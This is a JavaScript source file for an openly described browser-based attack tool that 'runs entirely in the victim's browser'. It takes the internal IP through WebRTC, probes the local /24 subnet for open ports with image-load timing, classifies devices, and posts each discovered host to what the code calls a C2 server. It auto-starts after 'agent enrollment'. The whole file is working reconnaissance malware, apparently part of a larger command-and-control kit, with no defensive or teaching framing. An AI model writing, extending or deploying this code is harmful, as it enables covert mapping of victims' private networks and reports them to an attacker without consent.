/**
 * Network Scanner - Internal Network Reconnaissance
 * Runs entirely in the victim's browser
 */

class NetworkScanner {
    constructor(agentId) {
        this.agentId = agentId;
        this.scanId = null;
        this.internalIP = null;
        this.subnet = null;
        this.discoveredHosts = [];
    }

    /**
     * Main scan function - orchestrates the entire scan
     */
    async startScan() {
        console.log('[Network Scanner] Starting network scan...');
        
        try {
            // Step 1: Get internal IP
            this.internalIP = await this.getInternalIP();
            
            if (!this.internalIP) {
                console.log('[Network Scanner] Could not determine internal IP');
                return;
            }
            
            console.log('[Network Scanner] Internal IP:', this.internalIP);
            
            // Step 2: Calculate subnet
            this.subnet = this.calculateSubnet(this.internalIP);
            console.log('[Network Scanner] Subnet:', this.subnet);
            
            // Step 3: Start scan on C2
            const scanStart = await fetch('/api/network/start_scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agent_id: this.agentId,
                    internal_ip: this.internalIP,
                    subnet: this.subnet
                })
            });
            
            const scanData = await scanStart.json();
            this.scanId = scanData.scan_id;
            
            console.log('[Network Scanner] Scan ID:', this.scanId);
            
            // Step 4: Scan the subnet
            await this.scanSubnet();
            
            // Step 5: Complete the scan
            await fetch('/api/network/complete_scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    scan_id: this.scanId,
                    total_hosts_scanned: 254
                })
            });
            
            console.log('[Network Scanner] ✅ Scan completed!');
            console.log('[Network Scanner] Hosts found:', this.discoveredHosts.length);
            
        } catch (error) {
            console.error('[Network Scanner] Error:', error);
        }
    }

    /**
     * Get internal IP address using multiple methods
     */
    async getInternalIP() {
        console.log('[Network Scanner] Attempting to get internal IP...');
        
        // Method 1: WebRTC
        let ip = await this.getIPviaWebRTC();
        
        if (ip) {
            console.log('[Network Scanner] Got IP via WebRTC:', ip);
            return ip;
        }
        
        console.log('[Network Scanner] WebRTC failed, trying fallback methods...');
        
        // Method 2: Common subnet guess
        ip = this.guessCommonSubnet();
        
        if (ip) {
            console.log('[Network Scanner] Using guessed subnet:', ip);
            return ip;
        }
        
        console.log('[Network Scanner] All methods failed');
        return null;
    }
    
    /**
     * Get IP via WebRTC
     */
    async getIPviaWebRTC() {
        return new Promise((resolve) => {
            try {
                const rtc = new RTCPeerConnection({
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' }
                    ]
                });
                
                let foundIP = null;
                let candidatesReceived = 0;
                
                rtc.createDataChannel('');
                
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = (event) => {
                    if (!event || !event.candidate) {
                        if (candidatesReceived === 0) {
                            console.log('[Network Scanner] No ICE candidates received');
                        }
                        rtc.close();
                        resolve(foundIP);
                        return;
                    }
                    
                    candidatesReceived++;
                    const candidate = event.candidate.candidate;
                    console.log('[Network Scanner] ICE candidate:', candidate);
                    
                    // Extract IP from candidate string
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = candidate.match(ipRegex);
                    
                    if (match && match[0]) {
                        const ip = match[0];
                        console.log('[Network Scanner] Found IP in candidate:', ip);
                        
                        // Only internal IPs (RFC1918)
                        if (ip.startsWith('192.168.') || 
                            ip.startsWith('10.') || 
                            (ip.startsWith('172.') && this.isPrivate172(ip))) {
                            console.log('[Network Scanner] ✅ Valid internal IP:', ip);
                            foundIP = ip;
                            rtc.close();
                            resolve(ip);
                        }
                    }
                };
                
                // Timeout after 5 seconds
                setTimeout(() => {
                    console.log('[Network Scanner] WebRTC timeout');
                    rtc.close();
                    resolve(foundIP);
                }, 5000);
                
            } catch (error) {
                console.error('[Network Scanner] WebRTC error:', error);
                resolve(null);
            }
        });
    }
    
    /**
     * Check if 172.x IP is in private range (172.16.0.0 - 172.31.255.255)
     */
    isPrivate172(ip) {
        const parts = ip.split('.');
        const secondOctet = parseInt(parts[1]);
        return secondOctet >= 16 && secondOctet <= 31;
    }
    
    /**
     * Guess common subnet (fallback)
     */
    guessCommonSubnet() {
        // Most common home network
        return '192.168.1.100';
    }

    /**
     * Calculate subnet from IP address
     */
    calculateSubnet(ip) {
        const parts = ip.split('.');
        // Assume /24 subnet (most common)
        return `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
    }

    /**
     * Scan the subnet for active hosts
     */
    async scanSubnet() {
        const parts = this.internalIP.split('.');
        const baseIP = `${parts[0]}.${parts[1]}.${parts[2]}`;
        
        console.log('[Network Scanner] Scanning subnet:', baseIP + '.0/24');
        
        // Scan in batches to avoid overwhelming the browser
        const batchSize = 10;
        
        for (let i = 1; i <= 254; i += batchSize) {
            const batch = [];
            
            for (let j = 0; j < batchSize && (i + j) <= 254; j++) {
                const ip = `${baseIP}.${i + j}`;
                batch.push(this.scanHost(ip));
            }
            
            await Promise.all(batch);
            
            // Small delay between batches
            await this.sleep(100);
        }
    }

    /**
     * Scan a single host for open ports
     */
    async scanHost(ip) {
        // Common ports to check
        const ports = [
            { port: 80, service: 'HTTP', type: 'web' },
            { port: 443, service: 'HTTPS', type: 'web' },
            { port: 22, service: 'SSH', type: 'server' },
            { port: 21, service: 'FTP', type: 'server' },
            { port: 23, service: 'Telnet', type: 'server' },
            { port: 445, service: 'SMB', type: 'file_server' },
            { port: 3389, service: 'RDP', type: 'windows' },
            { port: 8080, service: 'HTTP-Alt', type: 'web' },
            { port: 8443, service: 'HTTPS-Alt', type: 'web' },
            { port: 9000, service: 'Web', type: 'web' }
        ];
        
        const openPorts = [];
        const services = {};
        let totalResponseTime = 0;
        let responses = 0;
        
        // Scan each port
        for (const portInfo of ports) {
            const result = await this.checkPort(ip, portInfo.port);
            
            if (result.open) {
                openPorts.push(portInfo.port);
                services[portInfo.port] = portInfo.service;
                totalResponseTime += result.responseTime;
                responses++;
            }
        }
        
        // If we found open ports, report the host
        if (openPorts.length > 0) {
            const avgResponseTime = responses > 0 ? totalResponseTime / responses : 0;
            const deviceType = this.guessDeviceType(openPorts, services);
            
            await this.reportHost({
                ip_address: ip,
                open_ports: openPorts,
                services: services,
                device_type: deviceType,
                response_time: avgResponseTime
            });
            
            this.discoveredHosts.push(ip);
            console.log(`[Network Scanner] ✅ Found host: ${ip} (${deviceType}) - Ports: ${openPorts.join(', ')}`);
        }
    }

    /**
     * Check if a port is open using timing attack
     */
    async checkPort(ip, port) {
        return new Promise((resolve) => {
            const start = Date.now();
            const timeout = 1000; // 1 second timeout
            
            const img = new Image();
            
            const timeoutId = setTimeout(() => {
                img.src = '';
                resolve({ open: false, responseTime: 0 });
            }, timeout);
            
            img.onerror = () => {
                clearTimeout(timeoutId);
                const responseTime = Date.now() - start;
                
                // Fast response = port open (connection refused)
                // Slow response = port filtered/timeout
                const open = responseTime < 100;
                
                resolve({ open, responseTime });
            };
            
            img.onload = () => {
                clearTimeout(timeoutId);
                const responseTime = Date.now() - start;
                resolve({ open: true, responseTime });
            };
            
            // Try to connect to the port
            img.src = `http://${ip}:${port}/favicon.ico?${Date.now()}`;
        });
    }

    /**
     * Guess device type based on open ports
     */
    guessDeviceType(openPorts, services) {
        const portSet = new Set(openPorts);
        
        // Router detection
        if (portSet.has(80) || portSet.has(443)) {
            if (openPorts.length <= 3) {
                return 'router';
            }
        }
        
        // Printer detection
        if (portSet.has(9100) || portSet.has(515) || portSet.has(631)) {
            return 'printer';
        }
        
        // Windows detection
        if (portSet.has(3389) || portSet.has(445)) {
            return 'windows_workstation';
        }
        
        // Server detection
        if (portSet.has(22) || portSet.has(21) || portSet.has(23)) {
            return 'server';
        }
        
        // Web server
        if (portSet.has(80) || portSet.has(443) || portSet.has(8080)) {
            if (openPorts.length > 3) {
                return 'web_server';
            }
            return 'web_device';
        }
        
        // Camera/IoT
        if (portSet.has(554) || portSet.has(8000)) {
            return 'camera';
        }
        
        return 'unknown';
    }

    /**
     * Report discovered host to C2
     */
    async reportHost(hostData) {
        try {
            await fetch('/api/network/report_host', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    scan_id: this.scanId,
                    agent_id: this.agentId,
                    ...hostData
                })
            });
        } catch (error) {
            console.error('[Network Scanner] Error reporting host:', error);
        }
    }

    /**
     * Sleep helper
     */
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

/**
 * Auto-start network scan after agent enrollment
 */
async function startNetworkScan(agentId) {
    console.log('[Network Scanner] Initializing scan for agent:', agentId);
    
    const scanner = new NetworkScanner(agentId);
    
    // Wait a bit before starting
    setTimeout(() => {
        scanner.startScan();
    }, 5000);
}
